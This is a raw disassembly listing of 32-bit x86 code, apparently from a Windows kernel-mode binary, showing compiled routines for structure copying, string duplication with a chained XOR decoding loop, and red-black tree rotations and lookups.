   12a58:	mov    DWORD PTR [esi+0x8],eax
   12a5b:	mov    DWORD PTR [esi+0xc],edx
   12a5e:	test   edi,edi
   12a60:	jne    0x12a6d
   12a62:	push   0xc000009a
   12a67:	call   DWORD PTR ds:0x1ee14
   12a6d:	pop    edi
   12a6e:	mov    eax,esi
   12a70:	pop    esi
   12a71:	ret    
   12a72:	int3   
   12a73:	int3   
   12a74:	int3   
   12a75:	int3   
   12a76:	int3   
   12a77:	int3   
   12a78:	mov    edi,edi
   12a7a:	push   ebp
   12a7b:	mov    ebp,esp
   12a7d:	push   esi
   12a7e:	push   edi
   12a7f:	mov    edi,DWORD PTR [ebp+0x8]
   12a82:	push   edi
   12a83:	mov    esi,ecx
   12a85:	call   0x129ea
   12a8a:	lea    eax,[edi+0x8]
   12a8d:	push   eax
   12a8e:	lea    ecx,[esi+0x8]
   12a91:	call   0x129ea
   12a96:	mov    eax,DWORD PTR [edi+0x10]
   12a99:	mov    DWORD PTR [esi+0x10],eax
   12a9c:	lea    eax,[edi+0x14]
   12a9f:	push   eax
   12aa0:	lea    ecx,[esi+0x14]
   12aa3:	call   0x129ea
   12aa8:	lea    eax,[edi+0x1c]
   12aab:	push   eax
   12aac:	lea    ecx,[esi+0x1c]
   12aaf:	call   0x129ea
   12ab4:	lea    eax,[edi+0x24]
   12ab7:	push   eax
   12ab8:	lea    ecx,[esi+0x24]
   12abb:	call   0x129ea
   12ac0:	mov    eax,DWORD PTR [edi+0x2c]
   12ac3:	mov    DWORD PTR [esi+0x2c],eax
   12ac6:	mov    eax,DWORD PTR [edi+0x30]
   12ac9:	mov    DWORD PTR [esi+0x30],eax
   12acc:	mov    eax,DWORD PTR [edi+0x38]
   12acf:	mov    DWORD PTR [esi+0x38],eax
   12ad2:	mov    eax,DWORD PTR [edi+0x3c]
   12ad5:	mov    DWORD PTR [esi+0x3c],eax
   12ad8:	mov    eax,DWORD PTR [edi+0x40]
   12adb:	mov    DWORD PTR [esi+0x40],eax
   12ade:	mov    eax,DWORD PTR [edi+0x44]
   12ae1:	add    edi,0x48
   12ae4:	push   edi
   12ae5:	lea    ecx,[esi+0x48]
   12ae8:	mov    DWORD PTR [esi+0x44],eax
   12aeb:	call   0x129ea
   12af0:	pop    edi
   12af1:	mov    eax,esi
   12af3:	pop    esi
   12af4:	pop    ebp
   12af5:	ret    0x4
   12af8:	int3   
   12af9:	int3   
   12afa:	int3   
   12afb:	int3   
   12afc:	int3   
   12afd:	int3   
   12afe:	mov    edi,edi
   12b00:	push   esi
   12b01:	mov    esi,ecx
   12b03:	lea    ecx,[esi+0x8]
   12b06:	call   0x11eec
   12b0b:	push   DWORD PTR [esi]
   12b0d:	call   0x10a9a
   12b12:	pop    ecx
   12b13:	pop    esi
   12b14:	ret    
   12b15:	int3   
   12b16:	int3   
   12b17:	int3   
   12b18:	int3   
   12b19:	int3   
   12b1a:	mov    edi,edi
   12b1c:	push   ebp
   12b1d:	mov    ebp,esp
   12b1f:	push   esi
   12b20:	push   DWORD PTR [ebp+0xc]
   12b23:	mov    esi,ecx
   12b25:	push   DWORD PTR [ebp+0x8]
   12b28:	call   0x11170
   12b2d:	mov    eax,esi
   12b2f:	pop    esi
   12b30:	pop    ebp
   12b31:	ret    0x8
   12b34:	int3   
   12b35:	int3   
   12b36:	int3   
   12b37:	int3   
   12b38:	int3   
   12b39:	int3   
   12b3a:	mov    edi,edi
   12b3c:	push   ebp
   12b3d:	mov    ebp,esp
   12b3f:	mov    eax,DWORD PTR [ebp+0x8]
   12b42:	push   esi
   12b43:	push   DWORD PTR [eax+0x4]
   12b46:	mov    esi,ecx
   12b48:	push   DWORD PTR [eax]
   12b4a:	call   0x11170
   12b4f:	mov    eax,esi
   12b51:	pop    esi
   12b52:	pop    ebp
   12b53:	ret    0x4
   12b56:	int3   
   12b57:	int3   
   12b58:	int3   
   12b59:	int3   
   12b5a:	int3   
   12b5b:	int3   
   12b5c:	mov    edi,edi
   12b5e:	push   ebp
   12b5f:	mov    ebp,esp
   12b61:	push   ebx
   12b62:	push   esi
   12b63:	push   edi
   12b64:	mov    edi,DWORD PTR [ebp+0x8]
   12b67:	mov    eax,DWORD PTR [edi+0x4]
   12b6a:	mov    esi,ecx
   12b6c:	mov    ebx,DWORD PTR [esi]
   12b6e:	mov    DWORD PTR [esi+0x4],eax
   12b71:	xor    ecx,ecx
   12b73:	push   0x2
   12b75:	inc    eax
   12b76:	pop    edx
   12b77:	mul    edx
   12b79:	seto   cl
   12b7c:	neg    ecx
   12b7e:	or     ecx,eax
   12b80:	push   ecx
   12b81:	call   0x10a66
   12b86:	mov    ecx,DWORD PTR [esi+0x4]
   12b89:	add    ecx,ecx
   12b8b:	push   ecx
   12b8c:	mov    DWORD PTR [esi],eax
   12b8e:	push   DWORD PTR [edi]
   12b90:	push   eax
   12b91:	call   0x1daa0
   12b96:	mov    eax,DWORD PTR [esi+0x4]
   12b99:	mov    ecx,DWORD PTR [esi]
   12b9b:	xor    edx,edx
   12b9d:	push   ebx
   12b9e:	mov    WORD PTR [ecx+eax*2],dx
   12ba2:	call   0x10a9a
   12ba7:	add    esp,0x14
   12baa:	pop    edi
   12bab:	mov    eax,esi
   12bad:	pop    esi
   12bae:	pop    ebx
   12baf:	pop    ebp
   12bb0:	ret    0x4
   12bb3:	int3   
   12bb4:	int3   
   12bb5:	int3   
   12bb6:	int3   
   12bb7:	int3   
   12bb8:	mov    edi,edi
   12bba:	push   ebp
   12bbb:	mov    ebp,esp
   12bbd:	push   esi
   12bbe:	mov    esi,DWORD PTR [ebp+0x8]
   12bc1:	lea    eax,[ebp+0xc]
   12bc4:	push   eax
   12bc5:	mov    ecx,esi
   12bc7:	call   0x12b3a
   12bcc:	xor    ecx,ecx
   12bce:	inc    ecx
   12bcf:	cmp    DWORD PTR [esi+0x4],ecx
   12bd2:	jbe    0x12be6
   12bd4:	mov    eax,DWORD PTR [esi]
   12bd6:	lea    eax,[eax+ecx*2]
   12bd9:	mov    dx,WORD PTR [eax-0x2]
   12bdd:	xor    WORD PTR [eax],dx
   12be0:	inc    ecx
   12be1:	cmp    ecx,DWORD PTR [esi+0x4]
   12be4:	jb     0x12bd4
   12be6:	push   DWORD PTR [ebp+0xc]
   12be9:	call   0x10a9a
   12bee:	pop    ecx
   12bef:	mov    eax,esi
   12bf1:	pop    esi
   12bf2:	pop    ebp
   12bf3:	ret    0xc
   12bf6:	int3   
   12bf7:	int3   
   12bf8:	int3   
   12bf9:	int3   
   12bfa:	int3   
   12bfb:	int3   
   12bfc:	mov    edi,edi
   12bfe:	push   ebp
   12bff:	mov    ebp,esp
   12c01:	push   esi
   12c02:	mov    esi,DWORD PTR [ebp+0x8]
   12c05:	lea    eax,[ebp+0xc]
   12c08:	push   eax
   12c09:	mov    ecx,esi
   12c0b:	call   0x129c8
   12c10:	xor    ecx,ecx
   12c12:	inc    ecx
   12c13:	cmp    DWORD PTR [esi+0x4],ecx
   12c16:	jbe    0x12c27
   12c18:	mov    eax,DWORD PTR [esi]
   12c1a:	add    eax,ecx
   12c1c:	mov    dl,BYTE PTR [eax-0x1]
   12c1f:	xor    BYTE PTR [eax],dl
   12c21:	inc    ecx
   12c22:	cmp    ecx,DWORD PTR [esi+0x4]
   12c25:	jb     0x12c18
   12c27:	push   DWORD PTR [ebp+0xc]
   12c2a:	call   0x10a9a
   12c2f:	pop    ecx
   12c30:	mov    eax,esi
   12c32:	pop    esi
   12c33:	pop    ebp
   12c34:	ret    0xc
   12c37:	int3   
   12c38:	int3   
   12c39:	int3   
   12c3a:	int3   
   12c3b:	int3   
   12c3c:	mov    edi,edi
   12c3e:	push   ebp
   12c3f:	mov    ebp,esp
   12c41:	push   esi
   12c42:	push   DWORD PTR [ebp+0x8]
   12c45:	mov    esi,ecx
   12c47:	call   0x129c8
   12c4c:	push   DWORD PTR [ebp+0xc]
   12c4f:	lea    ecx,[esi+0x8]
   12c52:	call   0x129c8
   12c57:	mov    eax,esi
   12c59:	pop    esi
   12c5a:	pop    ebp
   12c5b:	ret    0x8
   12c5e:	int3   
   12c5f:	int3   
   12c60:	int3   
   12c61:	int3   
   12c62:	int3   
   12c63:	int3   
   12c64:	mov    edi,edi
   12c66:	push   ebp
   12c67:	mov    ebp,esp
   12c69:	mov    eax,DWORD PTR [ebp+0x8]
   12c6c:	mov    eax,DWORD PTR [eax]
   12c6e:	push   esi
   12c6f:	push   DWORD PTR [ebp+0xc]
   12c72:	mov    esi,ecx
   12c74:	lea    ecx,[esi+0x4]
   12c77:	mov    DWORD PTR [esi],eax
   12c79:	call   0x11f2a
   12c7e:	mov    eax,esi
   12c80:	pop    esi
   12c81:	pop    ebp
   12c82:	ret    0x8
   12c85:	int3   
   12c86:	int3   
   12c87:	int3   
   12c88:	int3   
   12c89:	int3   
   12c8a:	mov    edi,edi
   12c8c:	push   ebp
   12c8d:	mov    ebp,esp
   12c8f:	push   esi
   12c90:	push   edi
   12c91:	mov    edi,DWORD PTR [ebp+0x8]
   12c94:	push   edi
   12c95:	mov    esi,ecx
   12c97:	call   0x129c8
   12c9c:	lea    eax,[edi+0x8]
   12c9f:	push   eax
   12ca0:	lea    ecx,[esi+0x8]
   12ca3:	call   0x129c8
   12ca8:	mov    eax,DWORD PTR [edi+0x10]
   12cab:	mov    DWORD PTR [esi+0x10],eax
   12cae:	lea    eax,[edi+0x14]
   12cb1:	push   eax
   12cb2:	lea    ecx,[esi+0x14]
   12cb5:	call   0x129c8
   12cba:	lea    eax,[edi+0x1c]
   12cbd:	push   eax
   12cbe:	lea    ecx,[esi+0x1c]
   12cc1:	call   0x129c8
   12cc6:	lea    eax,[edi+0x24]
   12cc9:	push   eax
   12cca:	lea    ecx,[esi+0x24]
   12ccd:	call   0x129c8
   12cd2:	mov    eax,DWORD PTR [edi+0x2c]
   12cd5:	mov    DWORD PTR [esi+0x2c],eax
   12cd8:	mov    eax,DWORD PTR [edi+0x30]
   12cdb:	mov    DWORD PTR [esi+0x30],eax
   12cde:	mov    eax,DWORD PTR [edi+0x38]
   12ce1:	mov    DWORD PTR [esi+0x38],eax
   12ce4:	mov    eax,DWORD PTR [edi+0x3c]
   12ce7:	mov    DWORD PTR [esi+0x3c],eax
   12cea:	mov    eax,DWORD PTR [edi+0x40]
   12ced:	mov    DWORD PTR [esi+0x40],eax
   12cf0:	mov    eax,DWORD PTR [edi+0x44]
   12cf3:	add    edi,0x48
   12cf6:	push   edi
   12cf7:	lea    ecx,[esi+0x48]
   12cfa:	mov    DWORD PTR [esi+0x44],eax
   12cfd:	call   0x129c8
   12d02:	pop    edi
   12d03:	mov    eax,esi
   12d05:	pop    esi
   12d06:	pop    ebp
   12d07:	ret    0x4
   12d0a:	int3   
   12d0b:	int3   
   12d0c:	int3   
   12d0d:	int3   
   12d0e:	int3   
   12d0f:	int3   
   12d10:	mov    edi,edi
   12d12:	push   ebp
   12d13:	mov    ebp,esp
   12d15:	mov    eax,DWORD PTR [ebp+0x8]
   12d18:	mov    edx,DWORD PTR ds:0x7f6d4
   12d1e:	jmp    0x12d22
   12d20:	mov    eax,ecx
   12d22:	mov    ecx,DWORD PTR [eax]
   12d24:	cmp    ecx,edx
   12d26:	jne    0x12d20
   12d28:	pop    ebp
   12d29:	ret    0x4
   12d2c:	int3   
   12d2d:	int3   
   12d2e:	int3   
   12d2f:	int3   
   12d30:	int3   
   12d31:	int3   
   12d32:	mov    edi,edi
   12d34:	push   ebp
   12d35:	mov    ebp,esp
   12d37:	mov    eax,DWORD PTR [ecx+0x4]
   12d3a:	mov    ecx,DWORD PTR [eax+0x4]
   12d3d:	mov    edx,DWORD PTR ds:0x7f6c8
   12d43:	cmp    ecx,edx
   12d45:	je     0x12d60
   12d47:	push   esi
   12d48:	mov    esi,DWORD PTR [ebp+0x8]
   12d4b:	mov    esi,DWORD PTR [esi]
   12d4d:	cmp    DWORD PTR [ecx+0xc],esi
   12d50:	jae    0x12d57
   12d52:	mov    ecx,DWORD PTR [ecx+0x8]
   12d55:	jmp    0x12d5b
   12d57:	mov    eax,ecx
   12d59:	mov    ecx,DWORD PTR [ecx]
   12d5b:	cmp    ecx,edx
   12d5d:	jne    0x12d4d
   12d5f:	pop    esi
   12d60:	pop    ebp
   12d61:	ret    0x4
   12d64:	int3   
   12d65:	int3   
   12d66:	int3   
   12d67:	int3   
   12d68:	int3   
   12d69:	int3   
   12d6a:	mov    edi,edi
   12d6c:	push   ebp
   12d6d:	mov    ebp,esp
   12d6f:	mov    edx,DWORD PTR [ebp+0x8]
   12d72:	mov    eax,DWORD PTR [edx+0x8]
   12d75:	push   esi
   12d76:	mov    esi,DWORD PTR [eax]
   12d78:	mov    DWORD PTR [edx+0x8],esi
   12d7b:	mov    esi,DWORD PTR [eax]
   12d7d:	cmp    esi,DWORD PTR ds:0x7f6c8
   12d83:	je     0x12d88
   12d85:	mov    DWORD PTR [esi+0x4],edx
   12d88:	mov    esi,DWORD PTR [edx+0x4]
   12d8b:	mov    DWORD PTR [eax+0x4],esi
   12d8e:	mov    ecx,DWORD PTR [ecx+0x4]
   12d91:	pop    esi
   12d92:	cmp    edx,DWORD PTR [ecx+0x4]
   12d95:	jne    0x12d9c
   12d97:	mov    DWORD PTR [ecx+0x4],eax
   12d9a:	jmp    0x12daa
   12d9c:	mov    ecx,DWORD PTR [edx+0x4]
   12d9f:	cmp    edx,DWORD PTR [ecx]
   12da1:	jne    0x12da7
   12da3:	mov    DWORD PTR [ecx],eax
   12da5:	jmp    0x12daa
   12da7:	mov    DWORD PTR [ecx+0x8],eax
   12daa:	mov    DWORD PTR [eax],edx
   12dac:	mov    DWORD PTR [edx+0x4],eax
   12daf:	pop    ebp
   12db0:	ret    0x4
   12db3:	int3   
   12db4:	int3   
   12db5:	int3   
   12db6:	int3   
   12db7:	int3   
   12db8:	mov    edi,edi
   12dba:	push   ebp
   12dbb:	mov    ebp,esp
   12dbd:	mov    edx,DWORD PTR [ebp+0x8]
   12dc0:	mov    eax,DWORD PTR [edx]
   12dc2:	push   esi
   12dc3:	mov    esi,DWORD PTR [eax+0x8]
   12dc6:	mov    DWORD PTR [edx],esi
   12dc8:	mov    esi,DWORD PTR [eax+0x8]
   12dcb:	cmp    esi,DWORD PTR ds:0x7f6c8
   12dd1:	je     0x12dd6
   12dd3:	mov    DWORD PTR [esi+0x4],edx
   12dd6:	mov    esi,DWORD PTR [edx+0x4]
   12dd9:	mov    DWORD PTR [eax+0x4],esi
   12ddc:	mov    ecx,DWORD PTR [ecx+0x4]
   12ddf:	pop    esi
   12de0:	cmp    edx,DWORD PTR [ecx+0x4]
   12de3:	jne    0x12dea
   12de5:	mov    DWORD PTR [ecx+0x4],eax
   12de8:	jmp    0x12df9
   12dea:	mov    ecx,DWORD PTR [edx+0x4]
   12ded:	cmp    edx,DWORD PTR [ecx+0x8]
   12df0:	jne    0x12df7
   12df2:	mov    DWORD PTR [ecx+0x8],eax
   12df5:	jmp    0x12df9
   12df7:	mov    DWORD PTR [ecx],eax
   12df9:	mov    DWORD PTR [eax+0x8],edx
   12dfc:	mov    DWORD PTR [edx+0x4],eax
   12dff:	pop    ebp
   12e00:	ret    0x4
   12e03:	int3   
   12e04:	int3   
   12e05:	int3   
   12e06:	int3   
   12e07:	int3   
   12e08:	mov    edi,edi
   12e0a:	push   ebp
   12e0b:	mov    ebp,esp
   12e0d:	mov    eax,DWORD PTR [ecx+0x4]
   12e10:	push   esi
   12e11:	mov    esi,DWORD PTR [eax+0x4]
   12e14:	push   edi
   12e15:	mov    edi,eax
   12e17:	jmp    0x12e32
   12e19:	push   DWORD PTR [ebp+0x8]
   12e1c:	lea    eax,[esi+0x10]
   12e1f:	push   eax
   12e20:	call   0x197e8
   12e25:	test   al,al
   12e27:	je     0x12e2e
   12e29:	mov    esi,DWORD PTR [esi+0x8]
   12e2c:	jmp    0x12e32
   12e2e:	mov    edi,esi
   12e30:	mov    esi,DWORD PTR [esi]
   12e32:	cmp    esi,DWORD PTR ds:0x7f6d4
   12e38:	jne    0x12e19
   12e3a:	mov    eax,edi
   12e3c:	pop    edi
   12e3d:	pop    esi
   12e3e:	pop    ebp
   12e3f:	ret    0x4
   12e42:	int3   
   12e43:	int3   
   12e44:	int3   
   12e45:	int3   
   12e46:	int3   
   12e47:	int3   
   12e48:	mov    edi,edi
   12e4a:	push   ebp
   12e4b:	mov    ebp,esp
   12e4d:	mov    eax,DWORD PTR [ecx+0x4]
   12e50:	push   esi
   12e51:	mov    esi,DWORD PTR [eax+0x4]
   12e54:	push   edi
   12e55:	mov    edi,eax
   12e57:	jmp    0x12e72
   12e59:	push   DWORD PTR [ebp+0x8]
   12e5c:	lea    eax,[esi+0xc]
   12e5f:	push   eax
   12e60:	call   0x197e8
   12e65:	test   al,al
   12e67:	je     0x12e6e
   12e69:	mov    esi,DWORD PTR [esi+0x8]
   12e6c:	jmp    0x12e72
   12e6e:	mov    edi,esi
   12e70:	mov    esi,DWORD PTR [esi]
   12e72:	cmp    esi,DWORD PTR ds:0x7f6d8
   12e78:	jne    0x12e59
   12e7a:	mov    eax,edi
   12e7c:	pop    edi
   12e7d:	pop    esi
   12e7e:	pop    ebp
   12e7f:	ret    0x4
   12e82:	int3   
   12e83:	int3   
   12e84:	int3   
   12e85:	int3   
   12e86:	int3   
   12e87:	int3   
   12e88:	mov    edi,edi
   12e8a:	push   ebp
   12e8b:	mov    ebp,esp
   12e8d:	mov    eax,DWORD PTR [ecx+0x4]
   12e90:	mov    ecx,DWORD PTR [eax+0x4]
   12e93:	mov    edx,DWORD PTR ds:0x7f6dc
   12e99:	cmp    ecx,edx
   12e9b:	je     0x12eb6
   12e9d:	push   esi
   12e9e:	mov    esi,DWORD PTR [ebp+0x8]
   12ea1:	mov    esi,DWORD PTR [esi]
   12ea3:	cmp    DWORD PTR [ecx+0xc],esi
   12ea6:	jge    0x12ead
   12ea8:	mov    ecx,DWORD PTR [ecx+0x8]
   12eab:	jmp    0x12eb1
   12ead:	mov    eax,ecx
   12eaf:	mov    ecx,DWORD PTR [ecx]
   12eb1:	cmp    ecx,edx
   12eb3:	jne    0x12ea3
   12eb5:	pop    esi
   12eb6:	pop    ebp
   12eb7:	ret    0x4
   12eba:	int3   
   12ebb:	int3   
   12ebc:	int3   
   12ebd:	int3   
   12ebe:	int3   
   12ebf:	int3   
   12ec0:	mov    edi,edi
   12ec2:	push   esi
   12ec3:	mov    esi,ecx
   12ec5:	mov    ecx,DWORD PTR [esi]
   12ec7:	mov    eax,DWORD PTR [ecx+0x8]
   12eca:	cmp    eax,DWORD PTR ds:0x7f6d0
   12ed0:	je     0x12ede
   12ed2:	push   eax
   12ed3:	call   0x11286
   12ed8:	jmp    0x12eed
   12eda:	mov    DWORD PTR [esi],eax
   12edc:	mov    ecx,eax
   12ede:	mov    eax,DWORD PTR [ecx+0x4]
   12ee1:	cmp    ecx,DWORD PTR [eax+0x8]
   12ee4:	je     0x12eda
   12ee6:	mov    ecx,DWORD PTR [esi]
   12ee8:	cmp    DWORD PTR [ecx+0x8],eax
   12eeb:	je     0x12eef
   12eed:	mov    DWORD PTR [esi],eax
   12eef:	pop    esi
   12ef0:	ret    
   12ef1:	int3   
   12ef2:	int3   
   12ef3:	int3   
   12ef4:	int3   
   12ef5:	int3   
   12ef6:	mov    edi,edi
   12ef8:	push   esi
   12ef9:	mov    esi,ecx
   12efb:	mov    ecx,DWORD PTR [esi]
   12efd:	cmp    DWORD PTR [ecx+0x10],0x0
   12f01:	jne    0x12f10
   12f03:	mov    eax,DWORD PTR [ecx+0x4]
   12f06:	cmp    DWORD PTR [eax+0x4],ecx
   12f09:	jne    0x12f10
   12f0b:	mov    eax,DWORD PTR [ecx+0x8]
   12f0e:	jmp    0x12f2d
   12f10:	mov    eax,DWORD PTR [ecx]
   12f12:	cmp    eax,DWORD PTR ds:0x7f6cc
   12f18:	je     0x12f26
   12f1a:	push   eax
   12f1b:	call   0x11220
   12f20:	jmp    0x12f2d
   12f22:	mov    DWORD PTR [esi],eax
   12f24:	mov    ecx,eax
   12f26:	mov    eax,DWORD PTR [ecx+0x4]
   12f29:	cmp    ecx,DWORD PTR [eax]
   12f2b:	je     0x12f22
   12f2d:	mov    DWORD PTR [esi],eax
   12f2f:	pop    esi
   12f30:	ret    
   12f31:	int3   
   12f32:	int3   
   12f33:	int3   
   12f34:	int3   
   12f35:	int3   
   12f36:	mov    edi,edi
   12f38:	push   esi
   12f39:	mov    esi,ecx
   12f3b:	mov    ecx,DWORD PTR [esi]
   12f3d:	mov    eax,DWORD PTR [ecx+0x8]
   12f40:	cmp    eax,DWORD PTR ds:0x7f6cc
   12f46:	je     0x12f54
   12f48:	push   eax
   12f49:	call   0x11242
   12f4e:	jmp    0x12f63
   12f50:	mov    DWORD PTR [esi],eax
   12f52:	mov    ecx,eax
   12f54:	mov    eax,DWORD PTR [ecx+0x4]
   12f57:	cmp    ecx,DWORD PTR [eax+0x8]
   12f5a:	je     0x12f50
   12f5c:	mov    ecx,DWORD PTR [esi]
   12f5e:	cmp    DWORD PTR [ecx+0x8],eax
   12f61:	je     0x12f65
   12f63:	mov    DWORD PTR [esi],eax
   12f65:	pop    esi
   12f66:	ret    
   12f67:	int3   
   12f68:	int3   
   12f69:	int3   
   12f6a:	int3   
   12f6b:	int3   
   12f6c:	mov    edi,edi
   12f6e:	push   ebp
   12f6f:	mov    ebp,esp
   12f71:	mov    edx,DWORD PTR [ebp+0x8]
   12f74:	mov    eax,DWORD PTR [edx+0x8]
   12f77:	push   esi
   12f78:	mov    esi,DWORD PTR [eax]
   12f7a:	mov    DWORD PTR [edx+0x8],esi
   12f7d:	mov    esi,DWORD PTR [eax]
   12f7f:	cmp    esi,DWORD PTR ds:0x7f6cc
   12f85:	je     0x12f8a
   12f87:	mov    DWORD PTR [esi+0x4],edx
   12f8a:	mov    esi,DWORD PTR [edx+0x4]
   12f8d:	mov    DWORD PTR [eax+0x4],esi
   12f90:	mov    ecx,DWORD PTR [ecx+0x4]
   12f93:	pop    esi
   12f94:	cmp    edx,DWORD PTR [ecx+0x4]
   12f97:	jne    0x12f9e
   12f99:	mov    DWORD PTR [ecx+0x4],eax
   12f9c:	jmp    0x12fac
   12f9e:	mov    ecx,DWORD PTR [edx+0x4]
   12fa1:	cmp    edx,DWORD PTR [ecx]
   12fa3:	jne    0x12fa9
   12fa5:	mov    DWORD PTR [ecx],eax
   12fa7:	jmp    0x12fac
   12fa9:	mov    DWORD PTR [ecx+0x8],eax
   12fac:	mov    DWORD PTR [eax],edx
   12fae:	mov    DWORD PTR [edx+0x4],eax
   12fb1:	pop    ebp
   12fb2:	ret    0x4
   12fb5:	int3   
   12fb6:	int3   
   12fb7:	int3   
   12fb8:	int3   
   12fb9:	int3   
   12fba:	mov    edi,edi
   12fbc:	push   ebp
   12fbd:	mov    ebp,esp
   12fbf:	mov    edx,DWORD PTR [ebp+0x8]
   12fc2:	mov    eax,DWORD PTR [edx]
   12fc4:	push   esi
   12fc5:	mov    esi,DWORD PTR [eax+0x8]
   12fc8:	mov    DWORD PTR [edx],esi
   12fca:	mov    esi,DWORD PTR [eax+0x8]
   12fcd:	cmp    esi,DWORD PTR ds:0x7f6cc
   12fd3:	je     0x12fd8
   12fd5:	mov    DWORD PTR [esi+0x4],edx
   12fd8:	mov    esi,DWORD PTR [edx+0x4]
   12fdb:	mov    DWORD PTR [eax+0x4],esi
   12fde:	mov    ecx,DWORD PTR [ecx+0x4]
   12fe1:	pop    esi
   12fe2:	cmp    edx,DWORD PTR [ecx+0x4]
   12fe5:	jne    0x12fec
   12fe7:	mov    DWORD PTR [ecx+0x4],eax
   12fea:	jmp    0x12ffb
   12fec:	mov    ecx,DWORD PTR [edx+0x4]
   12fef:	cmp    edx,DWORD PTR [ecx+0x8]
   12ff2:	jne    0x12ff9
   12ff4:	mov    DWORD PTR [ecx+0x8],eax
   12ff7:	jmp    0x12ffb
   12ff9:	mov    DWORD PTR [ecx],eax
   12ffb:	mov    DWORD PTR [eax+0x8],edx
   12ffe:	mov    DWORD PTR [edx+0x4],eax
   13001:	pop    ebp
   13002:	ret    0x4
   13005:	int3   
   13006:	int3   
   13007:	int3   
   13008:	int3   
   13009:	int3   
   1300a:	mov    edi,edi
   1300c:	push   ebp
   1300d:	mov    ebp,esp
   1300f:	mov    eax,DWORD PTR [ecx+0x4]
   13012:	push   esi
   13013:	mov    esi,DWORD PTR [eax+0x4]
   13016:	push   edi
   13017:	mov    edi,eax
   13019:	jmp    0x13034
   1301b:	push   DWORD PTR [ebp+0x8]
   1301e:	lea    eax,[esi+0x10]
   13021:	push   eax
   13022:	call   0x197e8
   13027:	test   al,al
   13029:	je     0x13030
   1302b:	mov    esi,DWORD PTR [esi+0x8]
   1302e:	jmp    0x13034
   13030:	mov    edi,esi
   13032:	mov    esi,DWORD PTR [esi]
   13034:	cmp    esi,DWORD PTR ds:0x7f6d0
   1303a:	jne    0x1301b
   1303c:	mov    eax,edi
   1303e:	pop    edi
   1303f:	pop    esi
   13040:	pop    ebp
   13041:	ret    0x4
   13044:	int3   
   13045:	int3   
   13046:	int3   
   13047:	int3   
   13048:	int3   
   13049:	int3   
   1304a:	mov    edi,edi
   1304c:	push   ebp
   1304d:	mov    ebp,esp
   1304f:	mov    edx,DWORD PTR [ebp+0x8]
   13052:	mov    eax,DWORD PTR [edx+0x8]
   13055:	push   esi
   13056:	mov    esi,DWORD PTR [eax]
   13058:	mov    DWORD PTR [edx+0x8],esi
   1305b:	mov    esi,DWORD PTR [eax]
   1305d:	cmp    esi,DWORD PTR ds:0x7f6d0
   13063:	je     0x13068
   13065:	mov    DWORD PTR [esi+0x4],edx
   13068:	mov    esi,DWORD PTR [edx+0x4]
   1306b:	mov    DWORD PTR [eax+0x4],esi
   1306e:	mov    ecx,DWORD PTR [ecx+0x4]
   13071:	pop    esi
   13072:	cmp    edx,DWORD PTR [ecx+0x4]
   13075:	jne    0x1307c
   13077:	mov    DWORD PTR [ecx+0x4],eax
   1307a:	jmp    0x1308a
   1307c:	mov    ecx,DWORD PTR [edx+0x4]
   1307f:	cmp    edx,DWORD PTR [ecx]
   13081:	jne    0x13087
   13083:	mov    DWORD PTR [ecx],eax
   13085:	jmp    0x1308a
   13087:	mov    DWORD PTR [ecx+0x8],eax
   1308a:	mov    DWORD PTR [eax],edx
   1308c:	mov    DWORD PTR [edx+0x4],eax
   1308f:	pop    ebp
   13090:	ret    0x4
   13093:	int3   
   13094:	int3   
   13095:	int3   
   13096:	int3   
   13097:	int3   
   13098:	mov    edi,edi
   1309a:	push   ebp
   1309b:	mov    ebp,esp
   1309d:	mov    edx,DWORD PTR [ebp+0x8]
   130a0:	mov    eax,DWORD PTR [edx]
   130a2:	push   esi
   130a3:	mov    esi,DWORD PTR [eax+0x8]
   130a6:	mov    DWORD PTR [edx],esi
   130a8:	mov    esi,DWORD PTR [eax+0x8]
   130ab:	cmp    esi,DWORD PTR ds:0x7f6d0
   130b1:	je     0x130b6
   130b3:	mov    DWORD PTR [esi+0x4],edx
   130b6:	mov    esi,DWORD PTR [edx+0x4]
   130b9:	mov    DWORD PTR [eax+0x4],esi
   130bc:	mov    ecx,DWORD PTR [ecx+0x4]
   130bf:	pop    esi
   130c0:	cmp    edx,DWORD PTR [ecx+0x4]
   130c3:	jne    0x130ca
   130c5:	mov    DWORD PTR [ecx+0x4],eax
   130c8:	jmp    0x130d9
   130ca:	mov    ecx,DWORD PTR [edx+0x4]
   130cd:	cmp    edx,DWORD PTR [ecx+0x8]
   130d0:	jne    0x130d7
   130d2:	mov    DWORD PTR [ecx+0x8],eax
   130d5:	jmp    0x130d9
   130d7:	mov    DWORD PTR [ecx],eax
   130d9:	mov    DWORD PTR [eax+0x8],edx
   130dc:	mov    DWORD PTR [edx+0x4],eax
   130df:	pop    ebp
   130e0:	ret    0x4
   130e3:	int3   
   130e4:	int3   
   130e5:	int3   
   130e6:	int3   
   130e7:	int3   
   130e8:	mov    edi,edi
   130ea:	push   ebp
   130eb:	mov    ebp,esp
   130ed:	mov    eax,DWORD PTR [ecx+0x4]
   130f0:	mov    ecx,DWORD PTR [eax+0x4]
   130f3:	mov    edx,DWORD PTR ds:0x7f6c8
   130f9:	cmp    ecx,edx
   130fb:	je     0x13116
   130fd:	push   esi
   130fe:	mov    esi,DWORD PTR [ebp+0x8]
   13101:	mov    esi,DWORD PTR [esi]
   13103:	cmp    esi,DWORD PTR [ecx+0xc]
   13106:	jae    0x1310e
   13108:	mov    eax,ecx
   1310a:	mov    ecx,DWORD PTR [ecx]
   1310c:	jmp    0x13111
   1310e:	mov    ecx,DWORD PTR [ecx+0x8]
   13111:	cmp    ecx,edx
   13113:	jne    0x13103
   13115:	pop    esi
   13116:	pop    ebp
   13117:	ret    0x4
   1311a:	int3   
   1311b:	int3   
   1311c:	int3   
   1311d:	int3   
   1311e:	int3   
   1311f:	int3   
   13120:	mov    edi,edi
   13122:	push   ebp
   13123:	mov    ebp,esp
   13125:	mov    eax,DWORD PTR [ecx+0x4]
   13128:	push   esi
   13129:	mov    esi,DWORD PTR [eax+0x4]
   1312c:	push   edi
   1312d:	mov    edi,eax
   1312f:	jmp    0x1314a
   13131:	lea    eax,[esi+0x10]
   13134:	push   eax
   13135:	push   DWORD PTR [ebp+0x8]
   13138:	call   0x197e8
   1313d:	test   al,al
   1313f:	je     0x13147
   13141:	mov    edi,esi
   13143:	mov    esi,DWORD PTR [esi]
   13145:	jmp    0x1314a
   13147:	mov    esi,DWORD PTR [esi+0x8]
   1314a:	cmp    esi,DWORD PTR ds:0x7f6d4
   13150:	jne    0x13131
   13152:	mov    eax,edi
   13154:	pop    edi
   13155:	pop    esi
   13156:	pop    ebp
   13157:	ret    0x4
   1315a:	int3   
   1315b:	int3   
